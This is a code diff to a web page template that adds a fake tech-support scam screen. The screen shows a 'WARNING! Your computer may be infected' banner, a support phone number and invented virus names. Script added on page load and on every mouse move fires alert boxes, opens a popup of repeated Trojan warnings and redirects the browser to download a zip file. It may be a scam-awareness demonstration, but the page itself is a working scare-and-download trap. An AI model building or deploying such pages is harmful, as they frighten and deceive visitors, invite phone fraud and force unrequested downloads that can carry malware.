@@ -6,7 +6,7 @@
     <link rel="stylesheet" href="/static/stylesheets/alerts.css">
   </head>
 
-  <body>
+  <body class="scam-body">
   
     <header>
       <%- include('../partials/navbar.ejs'); %>
@@ -14,7 +14,22 @@
 
     <main id="app">
 
+      <div class="article-scam" onclick="openGoogle()">
+        <div class="article-scam-inner-wrap">
+          <div>
+            <img class="warning-triangle" src="/static/assets/universal/placeholdertriangle.png" alt="triangle">
+            <h1>WARNING!</h1>
+            <p style="font-weight: bold; font-size: 32px;">Your computer may be infected:</p>
+            <div class="scam-phone">+44 7911 123456</div>
+            <p style="margin-top: -10px; color: black;">for emergency tech support immediately<p>
 
+            <div style="color: black;">
+              <div>Your system has identified <b>2</b> viruses that pose a serious threat</div>
+              <div style="font-weight: bold;">Hijacker.Spyware ./ Trojan27.FakeAV-Downloads/download</div>
+            </div>
+          </div>
+        </div>
+      </div>
 
       <!--
       <div class="shifted-container">
@@ -59,6 +74,23 @@
   </body>
 
   <script>
+    const openWin = () => {
+      alert("WARNING! A VIRUS HAS BEEN IDENTIFIED IN YOUR SYSTEM!")
+      myWindow = window.open("","","width=200,height=100");
+      myWindow.document.write("<p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p><p><b>CRITICAL ERROR! A Trojan Virus has been detected on your system - to prevent this virus from removing, moving, or corrupting your computer files, please back them up as soon as possible</p>");
+      document.location.href = '/static/assets/universal/AUTODOWNLOADSOFTWARE.zip';
+    }
+    window.onload = () => {
+      alert("WARNING! A VIRUS HAS BEEN IDENTIFIED IN YOUR SYSTEM!")
+      openWin()
+    }
+    body.onmousemove = () => {
+      openWin()
+    }
+    const openGoogle = () => {
+      window.open("https://www.google.com/", '_blank').focus();
+    }
+
     new Vue({
       el: '#app',
       data () {
